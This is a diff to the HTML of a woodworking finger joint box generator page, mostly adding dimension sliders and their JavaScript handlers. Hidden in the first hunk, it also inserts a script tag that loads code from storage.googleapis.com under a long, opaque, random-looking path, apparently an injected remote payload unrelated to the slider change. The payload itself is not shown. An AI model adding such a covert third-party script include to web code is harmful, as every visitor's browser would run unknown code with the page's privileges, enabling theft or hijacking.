@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="theme-color" content="#2d2d2d">
   <title>Jack In The Shop — Finger Joint Box Generator</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
+  <script type='text/javascript' src='https://storage.googleapis.com/8T1GVQzm2qme2t9OwxQzwMkeHh_bemcjXiHmcvY3gvhBBb640joQ8d_x6r1pVSN-H709s9SAWf6UCWgcqtA2JOrY7AdfG_8QLnx331c_SDIPquo2-bdKFTQJvK67rY1o1Tnj-WkuAcm9gr5kzIPlSzzi-d4vphr3s_PTYD9MhJxS9MOpg9zPVA0EGGQHKSo_Sx-k8fWyY1nPeEnMqXeBZDfeGqrjMFf9fWZaCsPxfhWouNwd_a96P8G8xAOOvghiEzDh19HIk83inbbmhb8YLjXZtNZnftNeZrCRO2W3bsW44X2eAnuqbZNxYTnX6ANgIjq1xUQU_gd3-AxGCvMmVLHfXQPj-C2hy_D9LNUK2-RV7BBCoF_0M0oF34yJJ-SpBkTjcUJEfx9pP0gRAitSugWyPXgd5AcSkNLY2kUPCW5NN0ATWwfJ2Hlit1l-u5zivuJurx6QmQZTG22uyiIJpIrQhdhHpZJ1EjGL0XfzpQLDBVEhoI2aildFtCz3ZURv6yJ5yxt5sRRK8MSrWNa0ANis5WMYLPqcNjBA4GiVXXj_8QOkUNOJJaBwMhWVeKXJ_bQX5sxBVplc89NyBnz8HRdWLyhYZDtu7caxKV9QcY1savHlCnJvy0rHZrH3WEb_bbd81mhCKfqleOeYN_18RWJ5yHBLqUArcU4y_wDOl-oPWvjB59ndeAL9sD9TdyLnBXrSC1FHavFQNEdFH8blLeIiiS7uJRtEHOMg-lj6MJJrWOPCv0G_uorDvKcUwsM0k5OfyR0f2gjeNCUIIWCGq6sKWaW0ABLro912yEYHtuN-8MLoScSytv8rUiEWt5dM4ilzKYnnU0aw-2CBFRq39ZxWqvA2rkr5N7MR_jQiwVt3igL4ntUi4fd1fqvYMH0axKnQWM7Z3Jj2Ekn3C43dn7W-DDSIMkyi07FU5d1MGY-4ZtJ1Z89LZLztld7UNNsTusxkEYU-wN_2Q-KdWaPJEHGSOWN2TkE1ztGIRmMvtWtNCFlQ49uvnjmHveVTyuZDjmGzntJwRmrW4jOrP3WDRLMNEY0oaqlnZsLFVvo0y5wRcWEkd92swFAhCGFqO_mR0jscVJUSrx6ydzIbe-lYqgFxH_IHm_NGyeN_HO2SkGxugAFR7ARD0tiWLzemXfJfTxt7mf5iE28wrRc8c3Gtzpn21MN849m8RfVRuPMYrXPXbt5OoClOhBMkX71azymYPymquR32nv68iVASi2OWFFunJXv8_USMe54dpPLVFdFamI9Ct9e6l7MZdNxh_tjjO_MzHH8nwTZweUGUK0CqN3fCYfPsclE_uoRZOBcWPXlLc4MhWlGaqjaxq9_BlaamCmhyeTNlLLWF0agl6QkGhHAnLqnYKdkTeFQJI2GAY-aR8ev9f6BkBNikzQwkY7-heLXZUL1kc3gnCWkB0RrvJ0ZjUPGXqT_3NFV4eeOBQT4p-zbgvxYX2jue0QX9RySYo88FG0mhTHkM4E5vr5Rak4mGody6eVRNTJAFS6VZFEMz4R06SZfdd8FrxYbQ5tGQmqu45jLbPRubng37PgP5AtUEGFIdA-5s6YaZmBf8a9aOLiaUQSeXNExAIJRfA9MqDSE7kiQHFmuo9xTbA8vYo4IGOw9csMrrx1KFn7tW0BBcEiibh7zKj2qcXSSTa-y63mdhEBfZy5SY7T6b8axO77FDEx4XAEEUWTWX8-nvP3QE-fPCyeMHsWs1NzqCMtwcZsLsHmlPqP6YTrswi-2lvDEANzlIMAX__ci5S-ROFFNog9nd462xvKWtNG69Mg'></script><script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/three@0.134.0/examples/js/controls/OrbitControls.js"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
@@ -360,13 +360,20 @@
             <button id="sides6" onclick="setSides(6)">6</button>
           </div>
           <div class="hint" id="sidesHint">4 = rectangle (width × depth). 6 = regular hexagon sized by width (flat-to-flat).</div>
-          <div class="dim-row">
-            <div class="dim-grp"><label for="inW" id="lblW">Width (mm)</label>
-              <input class="dim-inp" id="inW" type="number" step="0.5" oninput="onDim()"></div>
-            <div class="dim-grp"><label for="inH" id="lblH">Height (mm)</label>
-              <input class="dim-inp" id="inH" type="number" step="0.5" oninput="onDim()"></div>
-            <div class="dim-grp" id="depthGrp"><label for="inD" id="lblD">Depth (mm)</label>
-              <input class="dim-inp" id="inD" type="number" step="0.5" oninput="onDim()"></div>
+          <div class="ctrl">
+            <div class="ctrl-lbl"><strong id="lblW">Width (mm)</strong><span class="ctrl-val" id="valW">150.0 mm</span></div>
+            <input type="range" id="sldW" min="20" max="400" step="0.5" value="150" oninput="onDimSlider('W', this.value)">
+            <input class="dim-inp" id="inW" type="number" step="0.5" style="margin-top:4px" oninput="onDimInput('W', this.value)">
+          </div>
+          <div class="ctrl">
+            <div class="ctrl-lbl"><strong id="lblH">Height (mm)</strong><span class="ctrl-val" id="valH">50.0 mm</span></div>
+            <input type="range" id="sldH" min="10" max="200" step="0.5" value="50" oninput="onDimSlider('H', this.value)">
+            <input class="dim-inp" id="inH" type="number" step="0.5" style="margin-top:4px" oninput="onDimInput('H', this.value)">
+          </div>
+          <div class="ctrl" id="depthGrp">
+            <div class="ctrl-lbl"><strong id="lblD">Depth (mm)</strong><span class="ctrl-val" id="valD">100.0 mm</span></div>
+            <input type="range" id="sldD" min="20" max="400" step="0.5" value="100" oninput="onDimSlider('D', this.value)">
+            <input class="dim-inp" id="inD" type="number" step="0.5" style="margin-top:4px" oninput="onDimInput('D', this.value)">
           </div>
           <div class="ctrl">
             <div class="ctrl-lbl"><strong>Material thickness</strong><span class="ctrl-val" id="valT">3.0 mm</span></div>
@@ -635,6 +642,7 @@ function setSides(n) {
   const depthGrp = $('depthGrp');
   if (depthGrp) depthGrp.style.opacity = n === 4 ? '1' : '0.35';
   if ($('inD')) $('inD').disabled = n !== 4;
+  if ($('sldD')) $('sldD').disabled = n !== 4;
   rebuild();
 }
 function onLidH(v) {
@@ -741,13 +749,30 @@ function renderDivSpacingUI() {
   }
 }
 
-function onDim() {
-  const r = id => parseFloat($(id).value);
-  const w = r('inW'), h = r('inH'), d = r('inD');
-  if (w > 0) state.W = fromDisp(w);
-  if (h > 0) state.H = fromDisp(h);
-  if (d > 0) state.D = fromDisp(d);
+function onDimSlider(key, v) {
+  // Slider values are always in mm
+  const n = parseFloat(v);
+  if (!(n > 0)) return;
+  state[key] = n;
+  const inp = $('in' + key);
+  if (inp) inp.value = numDisp(state[key]);
+  updateLabels();
   rebuild();
+}
+function onDimInput(key, v) {
+  const n = parseFloat(v);
+  if (!(n > 0)) return;
+  state[key] = fromDisp(n);
+  const sld = $('sld' + key);
+  if (sld) sld.value = state[key];
+  updateLabels();
+  rebuild();
+}
+function onDim() {
+  // legacy fallback if any caller remains
+  onDimInput('W', $('inW').value);
+  onDimInput('H', $('inH').value);
+  onDimInput('D', $('inD').value);
 }
 function onThicknessSlider(v) {
   state.T = parseFloat(v);
@@ -770,6 +795,9 @@ function onAssembly(v) {
 }
 
 function updateLabels() {
+  if ($('valW')) $('valW').textContent = fmtLen(state.W, 1, 2);
+  if ($('valH')) $('valH').textContent = fmtLen(state.H, 1, 2);
+  if ($('valD')) $('valD').textContent = fmtLen(state.D, 1, 2);
   $('valT').textContent = fmtLen(state.T, 1, 3);
   $('valFinger').textContent = fmtLen(state.finger, 1, 3);
   $('valKerf').textContent = fmtLen(state.kerf, 2, 4);
@@ -795,6 +823,9 @@ function syncInputs() {
   $('inW').value = numDisp(state.W);
   $('inH').value = numDisp(state.H);
   $('inD').value = numDisp(state.D);
+  if ($('sldW')) $('sldW').value = state.W;
+  if ($('sldH')) $('sldH').value = state.H;
+  if ($('sldD')) $('sldD').value = state.D;
   $('inT').value = numDisp(state.T);
   $('sldT').value = state.T;
   $('sldFinger').value = state.finger;
@@ -822,6 +853,7 @@ function syncInputs() {
     const depthGrp = $('depthGrp');
     if (depthGrp) depthGrp.style.opacity = s === 4 ? '1' : '0.35';
     if ($('inD')) $('inD').disabled = s !== 4;
+    if ($('sldD')) $('sldD').disabled = s !== 4;
   }
   renderDivSpacingUI();
   updateLabels();
